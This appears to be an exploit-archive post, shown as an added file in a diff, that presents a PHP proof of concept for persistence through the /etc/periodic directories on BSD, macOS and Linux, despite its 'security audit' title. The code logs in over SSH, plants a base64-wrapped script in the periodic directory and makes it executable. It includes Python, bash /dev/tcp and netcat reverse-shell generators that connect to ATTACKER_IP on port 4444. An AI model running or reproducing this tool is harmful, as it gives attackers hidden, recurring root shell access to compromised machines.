@@ -1,0 +1,501 @@
+=============================================================================================================================================
+| # Title     : Periodic Directory Security Audit V1.0                                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/210572/ & 	
+
+[+] Summary : 
+             This module implements persistence through the /etc/periodic directory system on Unix-like operating systems (BSD, macOS, Arch Linux). According to "The Art of Mac Malware" (2024), 
+			 no known malware currently uses this persistence mechanism, making it a novel and potentially undetected method for maintaining access to compromised systems.
+			 The /etc/periodic directory is a built‑in system maintenance mechanism used in older versions of macOS, BSD-based systems, and certain Unix-like environments. 
+			 Although largely deprecated in modern operating systems, the directory may still exist or be recreated manually, making it a potential vector for persistence or unauthorized script execution when misconfigured. 
+			 This proof‑of‑concept demonstrates how a script placed inside /etc/periodic can be triggered by periodic system tasks, provided sufficient privileges are present. 
+			 Since the directory is part of the operating system itself, it is not downloadable as a standalone component
+			 
+[+] Affected Systems :
+
+    Platforms: BSD, macOS (OSX), Arch Linux
+    Persistence Mechanism: Periodic directory scripts
+    Privileges Required: Root access
+    Detection Status: Currently undetected in wild
+			 
+[+]  POC : 
+
+php poc.php 
+
+<?php
+
+class SecurePeriodicScriptPersistence {
+    
+    private $session;
+    private $periodic_dir;
+    private $script_name;
+    private $cleanup_commands = [];
+    
+    public function __construct($session_handler, $periodic_dir = 'daily', $script_name = null) {
+        $this->session = $session_handler;
+        $this->periodic_dir = $periodic_dir;
+        $this->script_name = $script_name ?: $this->generate_secure_name();
+        $this->cleanup_commands = [];
+    }
+    
+    private function generate_secure_name($length = 12) {
+        $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        $name = '';
+        $max_index = strlen($chars) - 1;
+        
+        for ($i = 0; $i < $length; $i++) {
+            $name .= $chars[random_int(0, $max_index)];
+        }
+        return $name;
+    }
+    
+    public function check() {
+        $possible_paths = [
+            '/etc/periodic/',
+            '/usr/local/etc/periodic/',
+            '/var/etc/periodic/'
+        ];
+        
+        $writable_paths = [];
+        
+        foreach ($possible_paths as $base_path) {
+            $periodic_path = $base_path . $this->periodic_dir . '/';
+            
+            // Check if directory exists and is writable
+            $command = "test -d " . escapeshellarg($periodic_path) . " && test -w " . escapeshellarg($periodic_path) . " && echo 'WRITABLE' || echo 'NOT_WRITABLE'";
+            $result = $this->execute_command_with_retry($command);
+            
+            if (strpos($result, 'WRITABLE') !== false) {
+                $writable_paths[] = $periodic_path;
+            }
+        }
+        
+        if (!empty($writable_paths)) {
+            return "VULNERABLE: Writable paths found: " . implode(', ', $writable_paths);
+        }
+        
+        return "SAFE: No writable periodic directories found";
+    }
+    
+    private function execute_command_with_retry($command, $max_retries = 3) {
+        $retries = 0;
+        
+        while ($retries < $max_retries) {
+            try {
+                return $this->session->execute($command);
+            } catch (Exception $e) {
+                $retries++;
+                if ($retries >= $max_retries) {
+                    throw new Exception("Command failed after {$max_retries} attempts: " . $e->getMessage());
+                }
+                sleep(1);
+            }
+        }
+    }
+    
+    private function find_python_interpreter() {
+        $commands = [
+            'python3', 'python3.11', 'python3.10', 'python3.9', 'python3.8', 'python3.7', 'python'
+        ];
+        
+        foreach ($commands as $cmd) {
+            $result = $this->execute_command_with_retry("command -v " . escapeshellarg($cmd) . " 2>/dev/null");
+            $result = trim($result);
+            if (!empty($result) && $this->is_valid_python($cmd)) {
+                return $result;
+            }
+        }
+        
+        return null;
+    }
+    
+    private function is_valid_python($python_cmd) {
+        try {
+            $test_result = $this->execute_command_with_retry(escapeshellarg($python_cmd) . " -c \"print('OK')\" 2>/dev/null");
+            return trim($test_result) === 'OK';
+        } catch (Exception $e) {
+            return false;
+        }
+    }
+    
+    private function detect_platform() {
+        try {
+            $platform = $this->execute_command_with_retry('uname -s');
+            $platform = trim(strtolower($platform));
+            
+            if (strpos($platform, 'darwin') !== false) {
+                return 'macos';
+            } elseif (strpos($platform, 'bsd') !== false) {
+                return 'bsd';
+            } elseif (strpos($platform, 'linux') !== false) {
+                return 'linux';
+            } else {
+                return 'unknown';
+            }
+        } catch (Exception $e) {
+            return 'unknown';
+        }
+    }
+    
+    private function find_python_platform_aware() {
+        $platform = $this->detect_platform();
+        
+        $search_commands = [];
+        
+        switch ($platform) {
+            case 'macos':
+                $search_commands = ['python3', '/usr/bin/python3', '/opt/homebrew/bin/python3', '/usr/local/bin/python3'];
+                break;
+            case 'bsd':
+                $search_commands = ['python3', '/usr/local/bin/python3', '/usr/pkg/bin/python3', 'python'];
+                break;
+            case 'linux':
+                $search_commands = ['python3', 'python3.11', 'python3.10', 'python3.9', 'python3.8', 'python'];
+                break;
+            default:
+                $search_commands = ['python3', 'python'];
+        }
+        
+        foreach ($search_commands as $cmd) {
+            $result = $this->execute_command_with_retry("command -v " . escapeshellarg($cmd) . " 2>/dev/null");
+            $result = trim($result);
+            if (!empty($result) && $this->is_valid_python($cmd)) {
+                return $result;
+            }
+        }
+        
+        return null;
+    }
+    
+    public function install_persistence($payload, $target_type = 'python') {
+        echo "[*] Installing periodic script persistence...\n";
+        
+        try {
+            $payload_content = match($target_type) {
+                'python' => $this->build_secure_python_payload($payload),
+                'unix' => $this->build_shell_script_payload($payload),
+                'osx', 'bsd' => $this->build_shell_script_payload($payload),
+                default => throw new Exception("Unsupported target type: {$target_type}")
+            };
+            
+            $this->write_periodic_script_secure($payload_content);
+            
+            echo "[+] Persistence installed successfully\n";
+            return true;
+            
+        } catch (Exception $e) {
+            echo "[-] Installation failed: " . $e->getMessage() . "\n";
+            $this->cleanup();
+            return false;
+        }
+    }
+    
+    private function build_secure_python_payload($payload) {
+        $python_path = $this->find_python_platform_aware();
+        
+        if (!$python_path) {
+            throw new Exception("No working Python interpreter found");
+        }
+        
+        echo "[+] Found Python at: {$python_path}\n";
+        
+        // Encode payload to avoid quotation issues
+        $encoded_payload = base64_encode($payload);
+        $python_code = "import base64; exec(base64.b64decode('{$encoded_payload}').decode('utf-8'))";
+        
+        return "#!/bin/sh\n" . escapeshellarg($python_path) . " -c " . escapeshellarg($python_code);
+    }
+    
+    private function build_shell_script_payload($payload) {
+        return "#!/bin/sh\n{$payload}";
+    }
+    
+    private function write_periodic_script_secure($payload_content) {
+        $periodic_path = "/etc/periodic/{$this->periodic_dir}/";
+        $script_path = $periodic_path . $this->script_name;
+        
+        echo "[*] Writing periodic script to: {$script_path}\n";
+        
+        // Upload with verification
+        if (!$this->upload_file_with_verification($script_path, $payload_content)) {
+            throw new Exception("Failed to upload script with verification");
+        }
+        
+        // Make executable with verification
+        if (!$this->set_executable($script_path)) {
+            throw new Exception("Failed to make script executable");
+        }
+        
+        $this->cleanup_commands[] = "rm -f " . escapeshellarg($script_path);
+        echo "[+] Successfully installed periodic script\n";
+    }
+    
+    private function upload_file_with_verification($remote_path, $content, $max_retries = 2) {
+        $retries = 0;
+        
+        while ($retries < $max_retries) {
+            try {
+                $temp_local = tempnam(sys_get_temp_dir(), 'upload_');
+                if ($temp_local === false) {
+                    throw new Exception("Failed to create temporary file");
+                }
+                
+                if (file_put_contents($temp_local, $content) === false) {
+                    unlink($temp_local);
+                    throw new Exception("Failed to write to temporary file");
+                }
+                
+                if ($this->session->upload($temp_local, $remote_path)) {
+                    unlink($temp_local);
+                    
+                    // Verify upload
+                    if ($this->remote_file_exists($remote_path)) {
+                        return true;
+                    }
+                }
+                
+                unlink($temp_local);
+                
+            } catch (Exception $e) {
+                // Log and retry
+                if (isset($temp_local) && file_exists($temp_local)) {
+                    unlink($temp_local);
+                }
+            }
+            
+            $retries++;
+            if ($retries < $max_retries) {
+                sleep(1);
+            }
+        }
+        
+        throw new Exception("Upload failed after {$max_retries} attempts");
+    }
+    
+    private function remote_file_exists($remote_path) {
+        try {
+            $result = $this->execute_command_with_retry("test -f " . escapeshellarg($remote_path) . " && echo 'EXISTS' || echo 'NOT_EXISTS'");
+            return strpos($result, 'EXISTS') !== false;
+        } catch (Exception $e) {
+            return false;
+        }
+    }
+    
+    private function set_executable($file_path) {
+        try {
+            $command = "chmod +x " . escapeshellarg($file_path);
+            $this->execute_command_with_retry($command);
+            
+            // Verify permissions
+            $check_command = "test -x " . escapeshellarg($file_path) . " && echo 'EXECUTABLE' || echo 'NOT_EXECUTABLE'";
+            $check_result = $this->execute_command_with_retry($check_command);
+            
+            if (strpos($check_result, 'EXECUTABLE') === false) {
+                throw new Exception("File is not executable after chmod");
+            }
+            
+            return true;
+            
+        } catch (Exception $e) {
+            throw new Exception("Failed to set executable permissions: " . $e->getMessage());
+        }
+    }
+    
+    public function cleanup() {
+        echo "[*] Cleaning up persistence...\n";
+        
+        $failed_cleanups = [];
+        foreach ($this->cleanup_commands as $command) {
+            try {
+                $this->execute_command_with_retry($command);
+                echo "[+] Executed cleanup: {$command}\n";
+            } catch (Exception $e) {
+                $failed_cleanups[] = $command;
+                echo "[-] Failed to cleanup: {$command} - " . $e->getMessage() . "\n";
+            }
+        }
+        
+        if (!empty($failed_cleanups)) {
+            echo "[!] Some cleanups failed: " . implode(', ', $failed_cleanups) . "\n";
+        } else {
+            echo "[+] Cleanup completed successfully\n";
+        }
+        
+        $this->cleanup_commands = [];
+    }
+    
+    public function get_cleanup_commands() {
+        return $this->cleanup_commands;
+    }
+    
+    public function __destruct() {
+        // Auto-cleanup on destruction
+        if (!empty($this->cleanup_commands)) {
+            $this->cleanup();
+        }
+    }
+}
+
+class SecurePayloadGenerator {
+    
+    public static function generate_python_reverse_shell($lhost, $lport, $python_interpreter = null) {
+        $payload = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{$lhost}',{$lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])";
+        
+        if ($python_interpreter) {
+            $encoded_payload = base64_encode($payload);
+            $python_code = "import base64; exec(base64.b64decode('{$encoded_payload}').decode('utf-8'))";
+            return "#!/bin/sh\n" . escapeshellarg($python_interpreter) . " -c " . escapeshellarg($python_code);
+        }
+        
+        return $payload;
+    }
+    
+    public static function generate_bash_reverse_shell($lhost, $lport) {
+        return "bash -i >& /dev/tcp/{$lhost}/{$lport} 0>&1";
+    }
+    
+    public static function generate_netcat_reverse_shell($lhost, $lport) {
+        return "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {$lhost} {$lport} > /tmp/f";
+    }
+    
+    public static function generate_simple_test() {
+        return "echo 'Persistence test successful' > /tmp/periodic_test.txt";
+    }
+}
+
+// تغيير اسم الواجهة لتجنب التعارض مع SessionHandler المضمن في PHP
+interface RemoteSessionHandler {
+    public function execute($command);
+    public function upload($local_path, $remote_path);
+    public function download($remote_path, $local_path);
+}
+
+// Example SSH session implementation
+class SSHSessionHandler implements RemoteSessionHandler {
+    private $connection;
+    
+    public function __construct($host, $username, $password = null, $key_file = null) {
+        if (!function_exists('ssh2_connect')) {
+            throw new Exception("SSH2 extension not available");
+        }
+        
+        $this->connection = @ssh2_connect($host, 22);
+        if (!$this->connection) {
+            throw new Exception("Failed to connect to {$host}");
+        }
+        
+        if ($password) {
+            if (!@ssh2_auth_password($this->connection, $username, $password)) {
+                throw new Exception("SSH password authentication failed");
+            }
+        } elseif ($key_file) {
+            if (!@ssh2_auth_pubkey_file($this->connection, $username, $key_file . '.pub', $key_file)) {
+                throw new Exception("SSH key authentication failed");
+            }
+        } else {
+            throw new Exception("No authentication method provided");
+        }
+    }
+    
+    public function execute($command) {
+        $stream = @ssh2_exec($this->connection, $command);
+        if (!$stream) {
+            throw new Exception("Failed to execute command: {$command}");
+        }
+        
+        stream_set_blocking($stream, true);
+        $output = stream_get_contents($stream);
+        fclose($stream);
+        
+        return $output;
+    }
+    
+    public function upload($local_path, $remote_path) {
+        if (!file_exists($local_path)) {
+            throw new Exception("Local file does not exist: {$local_path}");
+        }
+        
+        return @ssh2_scp_send($this->connection, $local_path, $remote_path, 0755);
+    }
+    
+    public function download($remote_path, $local_path) {
+        return @ssh2_scp_recv($this->connection, $remote_path, $local_path);
+    }
+}
+
+// Command line interface
+if (php_sapi_name() === 'cli' && isset($argv[0]) && basename($argv[0]) === basename(__FILE__)) {
+    
+    if ($argc < 5) {
+        echo "Secure Periodic Script Persistence\n";
+        echo "==================================\n";
+        echo "Usage: php " . $argv[0] . " <host> <username> <password> <periodic_dir>\n";
+        echo "Example: php " . $argv[0] . " 192.168.1.100 root password123 daily\n";
+        echo "\nPeriodic directories: daily, weekly, monthly\n";
+        echo "Features:\n";
+        echo "- Secure random name generation\n";
+        echo "- Base64-encoded Python payloads\n";
+        echo "- Multi-platform Python detection\n";
+        echo "- Upload verification and retry logic\n";
+        echo "- Automatic cleanup\n";
+        exit(1);
+    }
+    
+    $host = $argv[1];
+    $username = $argv[2];
+    $password = $argv[3];
+    $periodic_dir = $argv[4];
+    
+    try {
+        echo "[*] Initializing secure persistence module...\n";
+        
+        $session = new SSHSessionHandler($host, $username, $password);
+        $persistence = new SecurePeriodicScriptPersistence($session, $periodic_dir);
+        
+        // Platform detection
+        $platform = $persistence->detect_platform();
+        echo "[*] Target platform: {$platform}\n";
+        
+        // Vulnerability check
+        $check_result = $persistence->check();
+        echo "[*] Security check: {$check_result}\n";
+        
+        if (strpos($check_result, 'VULNERABLE') === false) {
+            echo "[-] Target is not vulnerable, stopping\n";
+            exit(1);
+        }
+        
+        // Enhanced Python detection
+        $python_path = $persistence->find_python_platform_aware();
+        
+        if ($python_path) {
+            echo "[+] Using Python interpreter: {$python_path}\n";
+            $payload = SecurePayloadGenerator::generate_python_reverse_shell('ATTACKER_IP', 4444, $python_path);
+            $success = $persistence->install_persistence($payload, 'python');
+        } else {
+            echo "[-] Python not available, using shell fallback\n";
+            $payload = SecurePayloadGenerator::generate_bash_reverse_shell('ATTACKER_IP', 4444);
+            $success = $persistence->install_persistence($payload, 'unix');
+        }
+        
+        if ($success) {
+            echo "[+] Persistence installed successfully\n";
+            echo "[!] IMPORTANT: Replace ATTACKER_IP with your actual IP address\n";
+            echo "[*] Cleanup will occur automatically on script exit\n";
+        }
+        
+    } catch (Exception $e) {
+        echo "[-] Exploitation failed: " . $e->getMessage() . "\n";
+        exit(1);
+    }
+}
+
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
